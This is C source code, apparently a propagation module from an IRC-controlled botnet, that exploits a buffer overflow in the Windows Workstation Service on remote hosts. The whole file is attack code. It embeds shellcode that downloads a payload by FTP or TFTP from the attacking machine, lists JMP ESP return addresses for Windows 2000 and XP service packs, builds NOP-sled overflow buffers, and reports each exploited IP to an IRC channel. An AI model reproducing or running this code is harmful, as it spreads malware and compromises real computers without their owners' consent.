#ifndef NO_WksSvc
#include "includes.h"
#include "functions.h"
#include "externs.h"

typedef VOID (*MYPROC)(IN  LPCWSTR Server OPTIONAL,
    IN  LPCWSTR AlternateName,
    IN  LPCWSTR DomainAccount OPTIONAL,
    IN  LPCWSTR DomainAccountPassword OPTIONAL,
    IN  ULONG Reserved
    );
typedef int (__stdcall *MyNVN)(LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, ULONG);
typedef int (__stdcall *MyNAACN)(LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, ULONG);

char wks_shellcode[]= //ftp shellcode
	"\xE9\x6F\x00\x00\x00\x5B\xE8\x40\x01\x00\x00\x8D\xB3\x04\x00"
	"\x00\x00\x8D\xBB\x0D\x00\x00\x00\xC7\x83\x6A\x00\x00\x00\x0F\x00"
	"\x00\x00\xE8\xCD\x00\x00\x00\x89\x83\x3C\x00\x00\x00\x8D\xBB\x1C"
	"\x00\x00\x00\xC7\x83\x6A\x00\x00\x00\x0D\x00\x00\x00\xE8\xB2\x00"
	"\x00\x00\x89\x83\x38\x00\x00\x00\x8D\xBB\x29\x00\x00\x00\xE8\x95"
	"\x00\x00\x00\x89\x83\x34\x00\x00\x00\x8D\xB3\x40\x00\x00\x00\x8D"
	"\xBB\x47\x00\x00\x00\xE8\x7E\x00\x00\x00\x89\x83\x4E\x00\x00\x00"
	"\xE8\x24\x01\x00\x00\xE8\x8C\xFF\xFF\xFF\x00\x00\x00\x00\x6B\x65"
	"\x72\x6E\x65\x6C\x33\x32\x00\x47\x65\x74\x50\x72\x6F\x63\x41\x64"
	"\x64\x72\x65\x73\x73\x00\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72"
	"\x79\x41\x00\x45\x78\x69\x74\x54\x68\x72\x65\x61\x64\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6D\x73\x76\x63\x72\x74"
	"\x00\x73\x79\x73\x74\x65\x6D\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x56\xFF\x53\x38\x89\xC1\x57\x51"
	"\xFF\x53\x3C\xC3\x31\xC0\x89\x43\x66\x8B\x53\x66\x3B\x53\x56\x7D"
	"\x48\x42\x89\x53\x66\x31\xC0\x8B\x43\x66\xC1\xE0\x02\x8B\x4B\x5E"
	"\x01\xC1\x8B\x01\x03\x43\x52\x57\x56\x51\x89\xFE\x89\xC7\x8B\x4B"
	"\x6A\xF3\xA6\x59\x5E\x5F\x75\xD1\x31\xC0\x8B\x43\x66\xD1\xE0\x8B"
	"\x4B\x62\x01\xC1\x31\xC0\x66\x8B\x01\xC1\xE0\x02\x8B\x4B\x5A\x01"
	"\xC8\x8B\x08\x03\x4B\x52\x89\xC8\xC3\x31\xC0\xC3\x64\xA1\x30\x00"
	"\x00\x00\x3E\x8B\x40\x0C\x3E\x8B\x70\x1C\xAD\x3E\x8B\x68\x08\x89"
	"\x6B\x52\x89\xE8\x05\x3C\x00\x00\x00\x8B\x08\x03\x4B\x52\x81\xC1"
	"\x78\x00\x00\x00\x8B\x31\x03\x73\x52\x81\xC6\x18\x00\x00\x00\xAD"
	"\x89\x43\x56\xAD\x03\x43\x52\x89\x43\x5A\xAD\x03\x43\x52\x89\x43"
	"\x5E\xAD\x03\x43\x52\x89\x43\x62\xC3\xE9\x13\x00\x00\x00\x59\x8D"
	"\x91\x04\x00\x00\x00\x52\xFF\x53\x4E\x68\x00\x00\x00\x00\xFF\x53"
	"\x34\xE8\xE8\xFF\xFF\xFF\x00\x00\x00\x00\x00";

// :( /me likes unsigned long
DWORD dwJMPESP=0x7518A747;
//DWORD dwJMPESP=0x77D71CFC;

/* unsigned long wks_my_offsets[]=
{	0x77E14C29,		// Win2K SP4
	0x77E3CB4C,		// Win2K SP1
	0x77E42C75,		// Win2K SP4
	0x41424344 };	// Debug Target
*/

unsigned long wks_my_offsets[]=
{	0x77E14C29,		// Win2K SP4
	0x77E3CB4C,		// Win2K SP1
	0x77E42C75,		// Win2K SP4
	0x77E3C256,     // Win2K SP4 - PhaTTy JMP ESP user32.dll
	0x77E2AFC5,     // Win2K SP3 - PhaTTy JMP ESP user32.dll
	// 0x77E388A7,	// Win2K SP3 - PhaTTy JMP ESP user32.dll
	0x77E2492B,     // Win2K SP2 - PhaTTy JMP ESP user32.dll
	// 0x77E3AF64,	// Win2K SP2 - PhaTTy JMP ESP user32.dll
	0x77E4FF15,     // Win2K SP1 - PhaTTy JMP ESP user32.dll
	0x77E33F4D		// Win2K SP0 - PhaTTy JMP ESP user32.dll
	// 0x77E5324B,	// Win2K SP1 - PhaTTy JMP ESP user32.dll
};


/*
	SP0 & SP1:
	0x78011324
	SP2:
	0x78024e02
	SP3:
	0x77e822ea
	SP4:
	0x7c4fedbb
*/

/*
		Workstation Scanner starts here
		scans for wkssvc exploit
*/


BOOL WksSvc(EXINFO exinfo) {
	int iRet=0, iShellSize=0, iOffset=2;
	char szBuffer[3300], szShellBuf[4096];
	wchar_t wszBuffer[6600];
	NETRESOURCE nr; bool bRetVal=false;
	HINSTANCE hInstance;
	MyNVN procAddressNVN; MyNAACN procAddressNAACN;
	int iHostOS=FpHost(exinfo.ip, FP_PORT5K);
	if(iHostOS==OS_WINNT) return bRetVal;
	hInstance=LoadLibrary("netapi32.dll"); if(!hInstance) return bRetVal;

	if(iHostOS!=OS_WINXP) {
		procAddressNVN=(MyNVN)GetProcAddress(hInstance, "NetValidateName");
		if(!procAddressNVN) { FreeLibrary(hInstance); return bRetVal; }
		procAddressNAACN=NULL;
	} else {
		procAddressNAACN=(MyNAACN)GetProcAddress(hInstance, "NetAddAlternateComputerName");
		if(!procAddressNAACN) { FreeLibrary(hInstance); return bRetVal; }
		procAddressNVN=NULL;
	}

	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;
	nr.dwType=RESOURCETYPE_ANY;
	nr.lpRemoteName=(char*)malloc(strlen(exinfo.ip)+4096);
	sprintf(nr.lpRemoteName, "\\\\%s\\ipc$", exinfo.ip);

	while(true) {
		iRet=fWNetAddConnection2(&nr, "", "", 0);

		if(iRet!=NERR_Success && iRet!=ERROR_SESSION_CREDENTIAL_CONFLICT) break;

		if(PrivateIP(GetIP(exinfo.sock)) && !PrivateIP(exinfo.ip)) break;

		if (UseTFTP)
			iShellSize = GetRNS0TerminatedShellcode(szShellBuf, 4096, GetIP(exinfo.sock), filename);
		else
			iShellSize=setup_shellcode_ftp(wks_shellcode, sizeof(wks_shellcode), \
				szShellBuf, sizeof(szShellBuf), GetIP(exinfo.sock));

		memset(szBuffer, 0x90, sizeof(szBuffer));
		
		if(iHostOS!=OS_WINXP) {
			char *pBuff=szBuffer+1;
			for(int i=0; i<2026; i+=4) {
				*((unsigned long*)pBuff)=wks_my_offsets[iOffset];
				pBuff+=4; }

			pBuff=szBuffer+2026+20;
			if(sizeof(szBuffer)<2026+20+iShellSize) break;

			memcpy(pBuff, szShellBuf, iShellSize);
		} else {
			memcpy(szBuffer+2044, &dwJMPESP, 4);
			memset(szBuffer+2048, 0x90, 16);
			memcpy(szBuffer+2064, szShellBuf, iShellSize);

			memset(wszBuffer, 0x00, sizeof(wszBuffer));
			for (int x=0, i=0; x<=sizeof(szBuffer); x++, i+=2) {
				wszBuffer[i]=(unsigned short)szBuffer[x];
 			}

			MultiByteToWideChar(CP_ACP, NULL, szBuffer, sizeof(szBuffer), (unsigned short *)wszBuffer,sizeof(wszBuffer));
		}

		char szTemp[8192];
		sprintf(szTemp, "\\\\%s", exinfo.ip);
		wchar_t wszTemp[8192];
		MultiByteToWideChar(CP_ACP, 0, szTemp, strlen(szTemp)+1, wszTemp, (int)sizeof(wszTemp)/(int)sizeof(wszTemp[0]));

		if(iHostOS!=OS_WINXP) {
			iRet=(procAddressNAACN)(wszTemp, (unsigned short*)szBuffer, NULL, NULL, NetSetupUnknown);
		} else {
			iRet=(procAddressNAACN)(wszTemp,(unsigned short *)wszBuffer, NULL, NULL, NetSetupUnknown);
		}

		bRetVal=true;
		
		fWNetCancelConnection2(nr.lpRemoteName, 0, true);

		break; }

	if(nr.lpRemoteName) free(nr.lpRemoteName);
	FreeLibrary(hInstance); return bRetVal;

	char buffer[IRCLINE];
	char recvbuf[4096]; if(frecv(exinfo.sock, recvbuf, sizeof(recvbuf), 0) > 0) Sleep(500);
	_snprintf(buffer, sizeof(buffer), "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
	if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
	addlog(buffer);
	exploit[exinfo.exploit].stats++;
}
#endif